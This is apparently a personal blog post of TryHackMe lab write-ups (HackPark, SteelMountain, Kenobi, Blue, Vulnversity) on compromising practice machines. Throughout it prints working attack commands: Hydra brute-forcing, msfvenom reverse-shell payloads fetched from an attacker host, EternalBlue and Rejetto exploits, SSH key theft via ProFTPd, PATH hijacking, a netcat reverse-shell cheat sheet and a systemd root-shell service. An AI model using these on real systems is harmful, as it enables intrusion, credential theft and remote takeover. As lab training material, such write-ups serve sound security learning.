---
layout: post
title: Hacking
tags: ['security', 'cryptography']
icon: shield-lock
---

## TryHackMe

###  HackPark

Includes:
  - Windows
  - Hydra 
    - brute forcing credentials
  - Web application exploits
    - File inclusion
    - Directory traversal
  - WinPEAS
  - Metasploit
    - Stabilizing shells
  - Privilege Escalation

We can browse to the server via the internet to find a blog called `BlogEngine`. From here we can find a login page & can use hydra to try and exploit this.

#### Hydra

Try to login using random credentials & capture the body of the post request and note and changes on the page that would indicate a failed login.

Using this information we can create a quick bash script to run a bruteforce hydra attack against the web form - using the post body as `$form` and replacing the username and password with `^USER^` & `^PASS^` for hydra to replace these with the values we give it to run through. And use 'Login failed' as our failure condition.

```bash
#!/bin/bash

form="__VIEWSTATE=<redacted-for-clarity>&__EVENTVALIDATION=<redacted-for-clarity>&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in"

hydra -vV -l admin -P /usr/share/wordlists/rockyou.txt \
10.10.186.90 http-post-form \
"/Account/login.aspx?ReturnURL=/admin/:$form:F=Login failed"
```

After about 30s we find the password and can now login.

#### Exploiting `BlogEngine`

Using `searchsploit` to find exploits:
```bash
$> searchsploit blogengine

BlogEngine.NET 3.3.6 - Directory Traversal / Remote Code Execution | aspx/webapps/46353.cs
```

Mirror the exploit file:
```
$> searchsploit -m aspx/webapps/46353.cs
```

This file has a detailed overview at the top with how to go about using the exploit to gain remote access. The key details are:
- File must be uploaded as PostView.ascx
- Change the address and port in the script to the lhost and lport
- Upload via '/admin/app/editor/editpost.cshtml'
- Navigate to '/?theme=../../App_Data/files' to run the file

Running the file will give a reverse shell to our listener.

#### Enumerating

The shell we have is quite unstable so I want to stabilize it by creating a meterpreter shell via metasploit.

Craft our reverse shell using `msfvenom`:
```bash
$> msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -e x86/shikata_ga_nai -f exe -o msfvenom_reverse_shell.exe
```

Using our reverse shell we can grab the file from our server (using `python3 -m http.server`):
```powershell
cmd> powershell.exe -c "wget 'http://<ip>:8000/msfvenom_reverse_shell.exe' -OutFile 'C:\Users\Public\msfvenom_reverse_shell.exe'"
```

Create a listener on metasploit:
```bash
msf6> use exploit/multi/handler 
msf6> set payload windows/x64/shell/reverse_tcp
msf6> set lhost <ip>
msf6> set lport <port>
msf6> exploit
```

And the we can run our reverse shell:
```cmd
cmd> C:\Users\Public\msfvenom_reverse_shell.exe
```
& background the session `ctrl+z`

Upgrading to meterpreter:
```bash
msf6> use post/multi/manage/shell_to_meterpreter
msf6> sessions -l
msf6> set session <reverse-shell-session-id>
msf6> set lhost 10.9.7.128
msf6> set lport 4433
msf6> exploit
msf6> session -i <meterpreter-session-id>

meterpreter>
```
* I did notice the meterpreter/PS shell is still slightly unstable and likes to die from time to time. Keeping the original session around as a backup was handy.

Uploading and running `winPEAS`:
```
meterpreter> upload winPEASx86.exe
meterpreter> load powershell
meterpreter> powershell_shell

PS> .\winPEASx86.exe > winpeas.txt
PS> exit
PS> meterpreter > download winpeas.txt
```

Read/search the results:
```bash
more winpeas.txt
cat winpeas.txt | grep -i "<search>"
```
`more` is nice for this as it will use the shell syntax highlighting/colours, making it easier to read. The file is often extremely long and hard to read using `cat` or similar.  

This highlights a possibly vulnerable service:
```
=================================================================================================

WindowsScheduler(Splinterware Software Solutions - System Scheduler Service)[C:\PROGRA~2\SYSTEM~1\WService.exe] - Auto - Running
File Permissions: Everyone [WriteData/CreateFiles]
Possible DLL Hijacking in binary folder: C:\Program Files (x86)\SystemScheduler (Everyone [WriteData/CreateFiles])
System Scheduler Service Wrapper
=================================================================================================
```

It also finds some AutoLogon credentials:
```
  [+] Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultUserName               :  administrator
    DefaultPassword               :  4q6XvFES7Fdxs
```

#### Privilege escalation

The hackpark room wants us to exploit the service, so I will ignore the AutoLogon credentials.

Looking through the logs in `C:\Program Files (x86)\SystemScheduler` we can see its calling `Message.exe` as administrator. We can use our `msfvenom_reverse_shell.exe` we created earlier to gain a more stable reverse shell to replace `Message.exe`, and on the next scheduler cycle it will be run as an `Administrator`. 

Restart the listener we had earlier & wait for the next cycle (seems to be once every 1-2 minutes). This will give us a reverse shell as the `Administrator` account. From here we can gather the flags on both desktops and we've already ran `winPEAS` and gathered the other required information.

### SteelMountain [TryHackMe]

Attacking a Windows based machine.

Includes:
- Recon
  - nmap
  - web apps
  - searchsploit
- Exploit
  - metasploit
- Privilege esculation
  - Enumeration
  - Misconfiguration & exploiting services
  - msfvenom

#### Nmap

Use nmap to scan windows machine. `-Pn` is specified because windows was ignoring icmp requests.

```bash
$> sudo nmap -sS -sV -Pn -vv 10.10.30.80 -oA nmap-results.txt
...

PORT      STATE SERVICE            REASON          VERSION
80/tcp    open  http               syn-ack ttl 127 Microsoft IIS httpd 8.5
135/tcp   open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn        syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       syn-ack ttl 127 Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server? syn-ack ttl 127
8080/tcp  open  http               syn-ack ttl 127 HttpFileServer httpd 2.3
49152/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
49153/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
49155/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
49156/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
49163/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
```

#### Search for exploits

Find exploits related to the service running on port 8080, Rejetto Http File Server 2.3.

```bash
$> searchsploit "httpfileserver"
...

Rejetto HttpFileServer 2.3.x - Remote Command Execution (3) | windows/webapps/49125.py

$> searchsploit -p windows/webapps/49125.py
[CVE2014-6287](https://www.exploit-db.com/exploits/39161)
```

We can mirror the script shown in searchsploit and take a look at what it does. It just forms a url with a specific search query parameter that allows for remote code execution and makes a request to the service to perform that action.

```bash
$> searchsploit -m windows/webapps/49125.py
$> mv 49125.py command_exec.py

$> python3 command_exec.py 10.10.30.80 8080 whoami
http://10.10.30.80:8080/?search=%00{.+exec|whoami.}
```

The room tells us to use metasploit to perform the exploit though, maybe I will revisit scripting the exploit myself at a later date.

#### Metasploit

Using metasploit to exploit [`CVE2014-6287`](https://www.exploit-db.com/exploits/39161).

```bash
$> sudo msfconsole
msfconsole> search cve:2014-6287
...
0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution

msfconsole> use 0 
msfconsole> show options
...

msfconsole> set RHOSTS <ip>
msfconsole> set RPORT 8080
msfconsole> exploit

meterpreter> 
```
This gives us a meterpreter shell as bill now.

#### Enumeration

Performing enumeration to find possible privilege esculation attack vectors using [`PowerUp`](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1).

```bash
$> wget -c https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
meterpreter> upload /opt/PowerUp.ps1

meterpreter> load powershell
meterpreter> powershell_shell
```

```powershell
PS >. .\PowerUp.ps1
PS > Invoke-AllChecks
...

ServiceName                     : AdvancedSystemCareService9
Path                            : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiableFile                  : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
ModifiableFileIdentityReference : STEELMOUNTAIN\bill
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'AdvancedSystemCareService9'
CanRestart                      : True
Name                            : AdvancedSystemCareService9
Check                           : Modifiable Service Files
```

This shows us a service called `AdvancedSystemCareService9` the our user can restart and also has write access to the directory, so we can override the existing executable with our own.

#### `msfvenom` Reverse shell

Creating the reverse shell exe
```bash
$> msfvenom -p windows/shell_reverse_tcp LHOST=10.9.7.128 LPORT=4444 -e x86/shikata_ga_nai -f exe -o msfvenom_reverse_shell.exe
```

Create a listener
```bash
$> nc -lvnp 4444
```

Upload and execute as a service
```bash
meterpreter> upload /opt/msfvenom_reverse_shell.exe
meterpreter> powershell_shell

PS> net stop AdvancedSystemCareService9
PS> cp .\msfvenom_reverse_shell.exe 'C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe'

PS> net start AdvancedSystemCareService9
```

And we have an admin shell via our netcat listener

## Kenobi

[TryHackMe ~ Kenobi](https://tryhackme.com/room/kenobi)

Includes:
- Recon
  - nmap
  - samba enumeration
  - nfs scans
- Exploit
  - netcat
  - searchsploit
- Privilege esculation
  - SUID binaries
  - PATH poisoning

### Recon

#### Nmap 
Port and service scan:
```bash
nmap -sV -sC <ip> -oX nmap-service-scan.xml | tee nmap-sevice-scan.txt 

Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-22 10:42 BST

Not shown: 993 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/admin.html
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
    [... removed ...]
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
2049/tcp open  nfs_acl     2-3 (RPC #100227)
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h40m01s, deviation: 2h53m12s, median: 0s
|_nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: kenobi
|   NetBIOS computer name: KENOBI\x00
|   Domain name: \x00
|   FQDN: kenobi
|_  System time: 2021-04-22T04:43:37-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-04-22T09:43:38
|_  start_date: N/A
```

Samba share enum:
```bash
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse <ip>

Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-22 10:47 BST
Nmap scan report for <ip>
Host is up (0.57s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\<ip>\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\<ip>\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\<ip>\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>
```

nfs scan:
```bash
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount <ip>
```
Shows `/var` can be mounted via nfs.

#### Samba
Connect:
```bash
smbclient //<ip>/anonymous
```

Recursive download:
```bash
smbget -R smb://<ip>/anonymous
```
This gave a `log.txt` with some information about usernames, ssh key locations and the ftp service.

#### Searchspoilt
```bash
searchsploit proftp 1.3.5 
------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                |  Path
------------------------------------------------------------------------------ ---------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                     | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                           | linux/remote/36803.py
ProFTPd 1.3.5 - File Copy                                                     | linux/remote/36742.txt
------------------------------------------------------------------------------ ---------------------------------

searchsploit -p linux/remote/36742.txt
```
`linux/remote/36742.txt` shows an example of using nc and ProFTPd 1.3.5 to copy files to different locations on the system.

### Exploitation

#### Netcat -> ProFTPd File copy
We know the location of the ssh key from `log.txt` and a nfs location of `/var`.

```bash
nc <ip> 21                        
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [<ip>]

SITE CPFR /home/kenobi/.ssh/id_rsa 
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful
```

#### Retrieving key
```bash
mkdir /mnt/kenobi
mount <ip>:/var /mnt/kenobi
cp /mnt/kenobi/tmp/id_rsa .
```

#### Using Key
```bash
chmod 600 id_rsa
ssh -i ./id_rsa kenobi@<ip>
```
and we are in!

#### Privilege Esculation

#### Searching for root suid binaries
```bash
find / -perm -u=s -type f 2>/dev/null
```
This find typical binaries and files like ping, sudo etc and `/usr/bin/menu`

#### Exploiting this

Running `/usr/bin/menu` brings up 3 options that just look like preconfigured system commands.
```
strings /usr/bin/menu

curl -I localhost
uname -r
ifconfig
```
These are the commands that are being used and would be run as root, they don't specify a full path so we can exploit these using the PATH variable to redirect the issued command to our own binary that will be run as root.

```
cd /tmp
echo /bin/sh > curl
chmod 777 curl
PATH=/tmp:$PATH; /usr/bin/menu
```
Run the curl command via the menu binary and `#`, root shell!

### Blue

[TryHackMe ~ Blue](https://tryhackme.com/room/blue)

Notes on TryHackMe's room, blue. A beginner Windows challenge, covers basic recon, research, exploitation via metaspoilt & password cracking.   

#### Nmap Recon
Use nmap to scan ports and try to find details about services and versions on those ports 
```bash
nmap -sV -sC <target> -oX nmap-service-scan.xml

Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-21 18:07 BST
Stats: 0:00:33 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 44.44% done; ETC: 18:09 (0:00:40 remaining)
Nmap scan report for 10.10.123.129
Host is up (0.025s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=Jon-PC
| Not valid before: 2021-04-20T17:07:43
|_Not valid after:  2021-10-20T17:07:43
|_ssl-date: 2021-04-21T17:08:58+00:00; 0s from scanner time.
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49158/tcp open  msrpc              Microsoft Windows RPC
49160/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h14m59s, deviation: 2h30m00s, median: 0s
|_nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:f0:72:11:4a:01 (unknown)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Jon-PC
|   NetBIOS computer name: JON-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-04-21T12:08:53-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-04-21T17:08:53
|_  start_date: 2021-04-21T17:07:41

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 66.88 seconds
```

#### Searchspoilt
```bash
searchsploit --nmap ./nmap-service-scan.xml 

[i] SearchSploit's XML mode (without verbose enabled).   To enable: searchsploit -v --xml...
[i] Reading: './nmap-service-scan.xml'

[i] /usr/bin/searchsploit -t msrpc
[i] /usr/bin/searchsploit -t microsoft windows rpc
----------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                               |  Path
----------------------------------------------------------------------------- ---------------------------------
Microsoft Windows - 'Lsasrv.dll' RPC Remote Buffer Overflow (MS04-011)       | windows/remote/293.c
Microsoft Windows - 'RPC DCOM' Long Filename Overflow (MS03-026)             | windows/remote/100.c
Microsoft Windows - 'RPC DCOM' Remote (1)                                    | windows/remote/69.c
Microsoft Windows - 'RPC DCOM' Remote (2)                                    | windows/remote/70.c
Microsoft Windows - 'RPC DCOM' Remote (Universal)                            | windows/remote/76.c
Microsoft Windows - 'RPC DCOM' Remote Buffer Overflow                        | windows/remote/64.c
Microsoft Windows - 'RPC DCOM' Scanner (MS03-039)                            | windows/remote/97.c
Microsoft Windows - 'RPC DCOM2' Remote (MS03-039)                            | windows/remote/103.c
Microsoft Windows - 'RPC2' Universal / Denial of Service (RPC3) (MS03-039)   | windows/remote/109.c
Microsoft Windows - DCE-RPC svcctl ChangeServiceConfig2A() Memory Corruption | windows/dos/3453.py
Microsoft Windows - DCOM RPC Interface Buffer Overrun                        | windows/remote/22917.txt
Microsoft Windows - DNS RPC Remote Buffer Overflow (2)                       | windows/remote/3746.txt
Microsoft Windows - Net-NTLMv2 Reflection DCOM/RPC (Metasploit)              | windows/local/45562.rb
Microsoft Windows 10 1903/1809 - RPCSS Activation Kernel Security Callback P | windows/local/47135.txt
Microsoft Windows 2000/NT 4 - RPC Locator Service Remote Overflow            | windows/remote/5.c
Microsoft Windows 8.1 - DCOM DCE/RPC Local NTLM Reflection Privilege Escalat | windows/local/37768.txt
Microsoft Windows Message Queuing Service - RPC Buffer Overflow (MS07-065) ( | windows/remote/4745.cpp
Microsoft Windows Message Queuing Service - RPC Buffer Overflow (MS07-065) ( | windows/remote/4934.c
Microsoft Windows Server 2000 - RPC DCOM Interface Denial of Service         | windows/dos/61.c
Microsoft Windows Server 2000 SP4 - DNS RPC Remote Buffer Overflow           | windows/remote/3737.py
Microsoft Windows XP/2000 - 'RPC DCOM' Remote (MS03-026)                     | windows/remote/66.c
Microsoft Windows XP/2000 - RPC Remote Non Exec Memory                       | windows/remote/117.c
Microsoft Windows XP/2000/NT 4.0 - RPC Service Denial of Service (1)         | windows/dos/21951.c
Microsoft Windows XP/2000/NT 4.0 - RPC Service Denial of Service (2)         | windows/dos/21952.c
Microsoft Windows XP/2000/NT 4.0 - RPC Service Denial of Service (3)         | windows/dos/21953.txt
Microsoft Windows XP/2000/NT 4.0 - RPC Service Denial of Service (4)         | windows/dos/21954.txt
Microsoft Windows XP/2003 - RPCSS Service Isolation Privilege Escalation     | windows/local/32892.txt
----------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
^ didnt return what I was looking for, was looking for an SMB exploit. Did some research based on hints to find ms17-010.

#### MSF

Searching:
```
search ms17-010

Matching Modules
================

   #  Name                                           Disclosure Date  Rank     Check  Description
   -  ----                                           ---------------  ----     -----  -----------
   0  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   1  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection
   2  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   3  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
```

Using the exploit:
```
use exploit/windows/smb/ms17_010_eternalblue
show options
set payload windows/x64/shell/reverse_tcp
set RHOSTS 10.10.123.129
set LHOST 10.9.5.114
exploit

* should spawn a reverse shell
* ctrl + z to background it
```

Upgrade to meterpreter shell:
```
search shell_to_meterpreter
use post/multi/manage/shell_to_meterpreter
show options
sessions -l
set SESSION <exploit-shell-session-id>
exploit
sessions -i <meterpreter-session-id>

* should get a meterpreter shell here
```

Meterpreter:
```
shell
  -> whoami
     * NT AUTHORITY\SYSTEM
ps
migrate <process id>
hashdump
```

#### John
```bash
echo "Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::" > hash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT hash

Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
<password-was-here>         (Jon)
1g 0:00:00:00 DONE (2021-04-21 18:59) 1.851g/s 18889Kp/s 18889Kc/s 18889KC/s alr19882006..alpusidi
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed
```

From here find flags!

### Vulnversity

[TryHackMe ~ Vulnversity](https://tryhackme.com/room/vulnversity)

Notes on the beginner challenge, vulnversity. Covers basic recon, web application testing, file inclusion, reverse shells and privilege esculation.  

#### Nmap Recon
Use nmap to scan ports and try to find details about services and versions on those ports 
```bash
nmap -sV -sC <target>
```

#### Finding web routes
Try bruteforce webpages/directories using [gobuster](https://github.com/OJ/gobuster)
```bash
gobuster dir -u <webapp> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
```

#### Netcat commands
```bash
basic connection:
nc -lvnp 4444 [> /path/to/file.ext]
nc <ip> <port> [< /path/to/file.ext]

reverse shells:
nc -e /bin/bash <ip> <port>
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> <port> >/tmp/f
```
#### File inclusion for reverse shell
Upload [PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) as `.phtml`, setup a nc listener, load the phtml location.

#### Search for SUID bit
```bash
find / -perm /4000
...
/bin/systemctl
```

#### Privilege esculation
Reverse shell using netcat openbsd from systemctl service.
```bash
[Unit]
Description=root-shell

[Service]
ExecStart=/bin/bash -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> <port> >/tmp/f"

[Install]
WantedBy=multi-user.target
```
```bash
/bin/systemctl enable /path/to/root-shell.service
/bin/systemctl start root-shell
```


